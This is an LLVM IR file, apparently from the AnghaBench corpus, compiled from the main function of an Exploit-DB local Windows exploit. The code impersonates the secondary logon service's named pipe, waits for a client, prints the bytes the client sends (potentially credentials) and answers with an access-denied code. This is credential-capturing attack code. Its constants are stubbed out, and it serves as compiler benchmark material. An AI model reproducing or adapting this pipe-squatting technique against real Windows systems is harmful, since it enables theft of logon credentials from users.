; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21069.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21069.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SECONDARY_LOGON_PIPE = common dso_local global i32 0, align 4
@PIPE_ACCESS_DUPLEX = common dso_local global i32 0, align 4
@PIPE_TYPE_BYTE = common dso_local global i32 0, align 4
@PIPE_WAIT = common dso_local global i32 0, align 4
@MAX_INST = common dso_local global i32 0, align 4
@MAX_OUT_BUF = common dso_local global i32 0, align 4
@MAX_IN_BUF = common dso_local global i32 0, align 4
@NMPWAIT_USE_DEFAULT_WAIT = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [46 x i8] c"Can't create secondary logon pipe.  Error %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"Created pipe and waiting for clients...\0A\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"Read %d bytes.  (ASCII Dump)\0A\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"%c \00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@ERROR_ACCESS_DENIED = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = load i32, i32* @SECONDARY_LOGON_PIPE, align 4
  %9 = load i32, i32* @PIPE_ACCESS_DUPLEX, align 4
  %10 = load i32, i32* @PIPE_TYPE_BYTE, align 4
  %11 = load i32, i32* @PIPE_WAIT, align 4
  %12 = or i32 %10, %11
  %13 = load i32, i32* @MAX_INST, align 4
  %14 = load i32, i32* @MAX_OUT_BUF, align 4
  %15 = load i32, i32* @MAX_IN_BUF, align 4
  %16 = load i32, i32* @NMPWAIT_USE_DEFAULT_WAIT, align 4
  %17 = call i64 @CreateNamedPipe(i32 %8, i32 %9, i32 %12, i32 %13, i32 %14, i32 %15, i32 %16, i32 0)
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %20 = icmp eq i64 %18, %19
  br i1 %20, label %21, label %24

21:                                               ; preds = %0
  %22 = call i32 (...) @GetLastError()
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i32 %22)
  br label %72

24:                                               ; preds = %0
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %26 = load i64, i64* %1, align 8
  %27 = call i64 @ConnectNamedPipe(i64 %26, i32 0)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %67

29:                                               ; preds = %24
  %30 = load i32, i32* @MAX_IN_BUF, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %2, align 8
  %33 = alloca i32, i64 %31, align 16
  store i64 %31, i64* %3, align 8
  br label %34

34:                                               ; preds = %61, %29
  %35 = load i64, i64* %1, align 8
  %36 = load i32, i32* @MAX_IN_BUF, align 4
  %37 = call i64 @ReadFile(i64 %35, i32* %33, i32 %36, i32* %4, i32 0)
  %38 = icmp ne i64 %37, 0
  br i1 %38, label %39, label %65

39:                                               ; preds = %34
  %40 = load i32, i32* %4, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i32 %40)
  store i32 0, i32* %5, align 4
  br label %42

42:                                               ; preds = %58, %39
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %61

46:                                               ; preds = %42
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %33, i64 %48
  %50 = load i32, i32* %49, align 4
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32 %50)
  %52 = load i32, i32* %5, align 4
  %53 = srem i32 %52, 16
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %57

55:                                               ; preds = %46
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  br label %57

57:                                               ; preds = %55, %46
  br label %58

58:                                               ; preds = %57
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %42

61:                                               ; preds = %42
  %62 = load i32, i32* @ERROR_ACCESS_DENIED, align 4
  store i32 %62, i32* %6, align 4
  %63 = load i64, i64* %1, align 8
  %64 = call i32 @WriteFile(i64 %63, i32* %6, i32 4, i32* %7, i32 0)
  br label %34

65:                                               ; preds = %34
  %66 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %66)
  br label %67

67:                                               ; preds = %65, %24
  %68 = load i64, i64* %1, align 8
  %69 = call i32 @DisconnectNamedPipe(i64 %68)
  %70 = load i64, i64* %1, align 8
  %71 = call i32 @CloseHandle(i64 %70)
  br label %72

72:                                               ; preds = %67, %21
  ret void
}

declare dso_local i64 @CreateNamedPipe(i32, i32, i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i64 @ConnectNamedPipe(i64, i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i64 @ReadFile(i64, i32*, i32, i32*, i32) #1

declare dso_local i32 @WriteFile(i64, i32*, i32, i32*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

declare dso_local i32 @DisconnectNamedPipe(i64) #1

declare dso_local i32 @CloseHandle(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
